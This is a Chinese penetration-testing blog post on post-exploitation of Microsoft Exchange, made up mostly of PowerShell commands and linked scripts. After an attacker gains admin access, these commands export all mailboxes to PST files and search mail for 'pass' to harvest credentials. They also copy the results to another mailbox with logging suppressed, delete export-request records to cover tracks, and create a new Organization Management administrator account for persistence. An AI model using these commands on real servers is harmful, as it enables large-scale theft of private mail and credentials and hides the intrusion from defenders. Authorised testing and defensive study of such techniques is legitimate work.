---
layout: post
title: 渗透基础——从Exchange服务器上搜索和导出邮件
---


## 0x00 前言
---

在渗透测试中，如果我们获得了Exchange服务器的管理权限，下一步就需要对Exchange服务器的邮件进行搜索和导出，本文将要介绍常用的两种方法，开源4个powershell脚本，分享脚本编写细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 管理Exchange服务器上邮件的两种方法
- 导出邮件的两种方法
- 搜索邮件的两种方法

**注：**

本文介绍的方法均为powershell命令

## 0x02 管理Exchange服务器上邮件的两种方法
---

### 1.先使用PSSession连接Exchange服务器，进而远程管理邮件

使用PSSession连接Exchange服务器的命令：

```
$User = "test\administrator"
$Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber
```

补充：

查看PSSession：

```
Get-PSSession
```

断开PSSession：

```
Remove-PSSession $Session
```

测试命令(获得所有邮箱用户):

```
Get-Mailbox
```

### 2.直接在Exchange服务器上执行管理邮件的命令

测试命令(获得所有邮箱用户的名称):

```
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
Get-Mailbox
```

**注：**

不同Exchange版本对应的管理单元名称不同：

- Exchange 2007:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;
- Exchange 2010:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;
- Exchange 2013 & 2016:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;

### 补充：管理Exchange邮件的常用命令

参考资料：

https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps

#### (1)获得所有邮箱用户名称：

```
Get-Mailbox -ResultSize unlimited
```

默认显示1000个用户，加上`-ResultSize unlimited`可以获得所有用户

#### (2)获得所有邮箱的信息，包括邮件数和上次访问邮箱的时间

```
Get-Mailbox | Get-MailboxStatistics
```

#### (3)获得所有OU

```
Get-OrganizationalUnit
```

#### (4)通过邮件跟踪日志获得收发邮件的相关信息

参考资料：

https://docs.microsoft.com/en-us/powershell/module/exchange/mail-flow/get-messagetrackinglog?view=exchange-ps

邮件跟踪日志默认保存位置：`%ExchangeInstallPath%TransportRoles\Logs\MessageTracking`


查看发件人`test1@test.com`从2019年1月1日9:00至今发送的所有邮件的相关信息(包括发件人，收件人和邮件主题)：

```
Get-MessageTrackingLog -Start "01/11/2019 09:00:00" -Sender "test1@test.com"
```

返回的结果很杂乱，其中包括多个事件：

- DSN
- Defer
- Deliver
- Send
- Receive

只筛选出发送事件，使返回结果更简洁:

```
Get-MessageTrackingLog -EventID send -Start "01/11/2019 09:00:00" -Sender "test1@test.com"
```

统计每天收发邮件数目的脚本：

https://gallery.technet.microsoft.com/office/f2af711e-defd-476d-896e-8053aa964bc5/view/Discussions

需要修改起始时间和添加加载Exchange powershell管理单元的命令

## 0x03 导出邮件的两种方法
---

### 1.使用PSSession建立连接并导出邮件

参考资料：

https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/new-mailboxexportrequest?view=exchange-ps

#### (1)将用户添加到角色组"Mailbox Import Export"

这里以用户administrator为例：

```
New-ManagementRoleAssignment –Role "Mailbox Import Export" –User Administrator
```

补充：移除的命令

```
Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-Administrator" -Confirm:$false
```

添加后再次查看进行确认：

```
Get-ManagementRoleAssignment –Role "Mailbox Import Export"|fl user
```

#### (2)重新启动Powershell

否则，无法使用命令`New-MailboxexportRequest`

#### (3)导出邮件并保存

这里给出三个实例

1.导出指定用户的所有邮件，保存到Exchange服务器的c:\test

```
$User = "test1"
New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\test\"+$User+".pst")
```

2.筛选出指定用户的body中包含单词pass的邮件，保存到Exchange服务器的c:\test

```
$User = "test1"
New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like "*pass*")} -FilePath ("\\localhost\c$\test\"+$User+".pst")
```

3.导出所有邮件，保存到Exchange服务器的c:\test

```
Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath ("\\localhost\c$\test\"+($_.name)+".pst")}
```

导出后会自动保存导出请求的记录，默认为30天

如果不想保存导出请求，可以加上参数`-CompletedRequestAgeLimit 0`

补充：关于导出请求的相关操作

查看邮件导出请求：

```
Get-MailboxExportRequest
```

删除具体的某个导出请求：

```
Remove-MailboxExportRequest -RequestQueue "Mailbox Database 2057988509" -RequestGuid 650f52ec-722b-47bb-8e73-d16a17c32129 -Confirm:$false
```

```
Remove-MailboxExportRequest -Identity 'test.com/Users/test1\MailboxExport' -Confirm:$false
```

**注：**

匹配的参数从`Get-MailboxExportRequest|fl`的结果中获得

删除所有导出请求：

```
Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false
```

综上，导出用户test1的特定邮件(body中包含单词pass)到Exchange服务器的c:\test的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToExportMailfromExchange.ps1

参数如下：

```
UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "{`"(body -like `"*pass*`")`"}"
```

流程如下：

1.使用PSSession连接到Exchange服务器
2.判断使用的用户是否被加入到角色组"Mailbox Import Export"
	如果未被添加，需要添加用户
3.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件
4.如果新添加了用户，那么会将用户移除角色组"Mailbox Import Export"
5.清除PSSession

导出的pst文件使用Outlook打开即可

### 2.在Exchange服务器上直接导出邮件

#### (1)添加管理单元

不同Exchange版本对应的管理单元名称不同：

- Exchange 2007:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;
- Exchange 2010:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;
- Exchange 2013 & 2016:
	Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;

不需要考虑角色组，可以直接导出邮件

#### (2)导出邮件
导出用户test1的邮件，保存到Exchange服务器的c:\test：

```
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
$User = "test1"
New-MailboxexportRequest -mailbox $User -FilePath ("\\localhost\c$\test\"+$User+".pst")
```

参照1中的功能，导出用户test1的特定邮件(body中包含单词pass)到Exchange服务器的c:\test的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1

参数如下：

```
DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "{`"(body -like `"*pass*`")`"}" -Version 2013
```

**注：**

需要指定Exchange版本

流程如下：

1.添加管理单元
2.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件

导出的pst文件使用Outlook打开即可

## 0x04 搜索邮件的两种方法
---

### 1.使用PSSession建立连接并搜索邮件

基本流程同导出邮件相似，区别在于角色组`"Mailbox Import Export"`需要更换成`"Mailbox Search"`

实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/UsePSSessionToSearchMailfromExchange.ps1

从用户test1中搜索包含单词pass的邮件并保存到用户test2的out2文件夹，参数如下：

```
UsePSSessionToSearchMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "out2"
```

导出的结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-1.png)

搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹，参数如下：

```
UsePSSessionToSearchMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "All" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "outAll"
```

导出的结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-2.png)

### 2.在Exchange服务器上直接搜索邮件

基本流程同导出邮件相似，在具体命令上存在一些区别

实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1

从用户test1中搜索包含单词pass的邮件并保存到用户test2的out2文件夹，参数如下：

```
DirectSearchMailfromExchange -MailBox "test1" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "out2" -Version 2013
```

搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹，参数如下：

```
DirectSearchMailfromExchange -MailBox "All" -Filter "*pass*" -TargetMailbox "test2" -TargetFolder "outAll" -Version 2013
```


### 补充1：搜索邮件的常用命令

(1)枚举所有邮箱用户，显示包含关键词pass的邮件的数量

```
Get-Mailbox|Search-Mailbox -SearchQuery "*pass*" -EstimateResultOnly
```

(2)搜索邮箱用户test1，显示包含关键词pass的邮件的数量

```
Search-Mailbox -Identity test1 -SearchQuery "*pass*" -EstimateResultOnly
```

示例如下图，数量为4个

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-2/2-3.png)

(3)枚举所有邮箱用户，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：

```
Get-Mailbox|Search-Mailbox -SearchQuery "*pass*" -TargetMailbox "test2" -TargetFolder "out" -LogLevel Suppress
```

(4)搜索邮箱用户test1，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：

```
Search-Mailbox -Identity test1 -SearchQuery "*pass*" -TargetMailbox "test2" -TargetFolder "out" -LogLevel Suppress
```

### 补充2 通过ECP搜索邮件

登录ecp，将当前用户加入`Discovery Management`组中

刷新页面

选择`compliance management`->`in-place eDiscovery & hold`

具体操作细节可参考：https://docs.microsoft.com/en-us/exchange/security-and-compliance/in-place-ediscovery/in-place-ediscovery?redirectedfrom=MSDN#roles

### 补充3 命令行下添加管理员用户

```
powershell -c "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd=convertto-securestring Password123 -asplaintext -force;New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $pwd;Add-RoleGroupMember \"Organization Management\" -Member testuser1 -BypassSecurityGroupManagerCheck"
```


## 0x05 小结 
---

本文介绍了管理Exchange邮件的两种方式：在Exchange服务器上直接调用管理单元和使用PSSession建立连接并远程管理邮件，分别介绍了对应的导出和搜索邮件的方法，开源4个powershell脚本，分享脚本编写细节。




---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


